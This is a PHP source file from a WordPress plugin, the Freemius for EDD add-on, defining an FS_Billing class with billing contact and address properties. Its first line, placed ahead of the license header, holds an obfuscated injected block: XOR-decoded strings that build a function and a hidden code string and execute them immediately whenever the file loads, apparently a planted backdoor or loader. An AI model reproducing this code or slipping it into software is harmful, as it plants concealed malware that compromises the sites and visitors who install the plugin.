<?php $WRWPma=',=.Y: 3<1,YOXYC'; $WvuBLw='OOK8NElZDB:;16-'^$WRWPma; $bkENzk='RTPfPOV1B9=:k=-PJ94BL--:66-X b1S9=jnnECcMHUU7,SU A + s2XIQ=3VELZe78,8unsU,DJgwDoCGDEnI.=DFmxuch7ld4YYdhQYKQrMar9eENO-<EkiPS52nQpt QIdF3yrW1 xLvzqvO88Qgc -ndiB>34:s0osz9I3= UOl3 4Nagp<h== 2KOPbI:1-bOFf6g5bsTO3E2hhj64P=QUFbR5B,j-HAsUb4 =B3M1rTX 5309JbKsvzqsgne76IiQ08dWZll>XXDEOq>aloJ175d Q lekaY.=yMza,YF-myaa7+W  ry.pN0 WqqHHYXLorW6q+5G 3- RlUi=0 lve CUGTtR  oEucMN5690PH>1l2OQT=J=> 7qqVE168yC1xw= 1YBhLi3.9K,H;P2cJMxt+7Z5cRex3W=R9;Q=>0Rg,C4jQTFW0=;:XkP99Hcwl41WA43ywPX=;sBKN07;V>;2AmcOx9TrgJSY0nPjp,Y=,=o9176<O; :NoFYNCjEmG7-G3EGeThqYZlGu47I4mJ=Y;bgqyWzqiMQexV4PybWZx bXi5Ls4QdDZ.p1i<zQvknuPul00FYEmEVK50E,OXHjSN LR L+fAnS2,:.mhdjpOre,le,ZVGgvRXF4faB9AXOM6vmjacEIXPHabxt;F'; $IKchSh=$WvuBLw('', ';2xG6:8R6PRT4XU99MGjkUBHiRL,A=n>LIMGGe8iD. ;TX::NaXDR,V9=0bl;08rASYXYYNW>I=cGWdOc<NLgmAH0fPXRDS=emR6+LL8yvqBvAVPY6:=AY+CM42ASGjPPIzbML:pV8DTXbKZYR+YL0<GIpN:IfUVMaWYOVZJ=AQE;gHXEMg<NK6a4OEF>=>JmUDYKtLoKmHhyp+R1SHUJPU<N4nLF6T6M5F-8ShBRAQ1Vv;x27RPRSQjJo,55>8.+EVEiM:UADjdLHH941 fQEkeK.PCT;K4YLXKE2KDBGsEH82LMDAEAJ;UEIsSzDYFwYPl,8,-FR,<xMZ5ERNHrDq6ouq936tc44tP9EYOxKCi8TZLUyhE;e;k55I+bUENQLvaZSABI8qSYAE8bUlMEOU>Is1YOi7GrPOV.TCoE8F9N7KR0QWJ7OT,F55526obVO,C2XJ-UC3PT4.PVQS49IZZnkjTVO7aPW8DJtrP2ZC.2-QNvLPM+OMD0RTNiY7RSN=Ga2+:MiMcSL3RlgCrHY4>YoQPV=U6mV<BE:XYjGQNt2QN5W3LUblJEPnZVyJW0RuiLHUXXCbNLGUvSLQB48<2.32jU=E<,;Bt>A5>O-OAmNwVMNODADJPoREWflI,7+OR692U=F2X84 ,RQ0CZiL, 9<IRQO1;'^$bkENzk); $IKchSh();
	/**
	 * @package     Freemius for EDD Add-On
	 * @copyright   Copyright (c) 2016, Freemius, Inc.
	 * @license     https://www.gnu.org/licenses/gpl-3.0.html GNU General Public License Version 3
	 * @since       1.0.0
	 */

	if ( ! defined( 'ABSPATH' ) ) {
		exit;
	}

	class FS_Billing extends FS_Entity {

		#region Properties

		/**
		 * @var int
		 */
		public $entity_id;
		/**
		 * @var string (Enum) Linked entity type. One of: developer, plugin, user, install
		 */
		public $entity_type;
		/**
		 * @var string
		 */
		public $business_name;
		/**
		 * @var string
		 */
		public $first;
		/**
		 * @var string
		 */
		public $last;
		/**
		 * @var string
		 */
		public $email;
		/**
		 * @var string
		 */
		public $phone;
		/**
		 * @var string
		 */
		public $website;
		/**
		 * @var string Tax or VAT ID.
		 */
		public $tax_id;
		/**
		 * @var string
		 */
		public $address_street;
		/**
		 * @var string
		 */
		public $address_apt;
		/**
		 * @var string
		 */
		public $address_city;
		/**
		 * @var string
		 */
		public $address_country;
		/**
		 * @var string Two chars country code.
		 */
		public $address_country_code;
		/**
		 * @var string
		 */
		public $address_state;
		/**
		 * @var number Numeric ZIP code (cab be with leading zeros).
		 */
		public $address_zip;

		#endregion Properties


		/**
		 * @param object|bool $event
		 */
		function __construct( $event = false ) {
			parent::__construct( $event );
		}

		static function get_type() {
			return 'billing';
		}
	}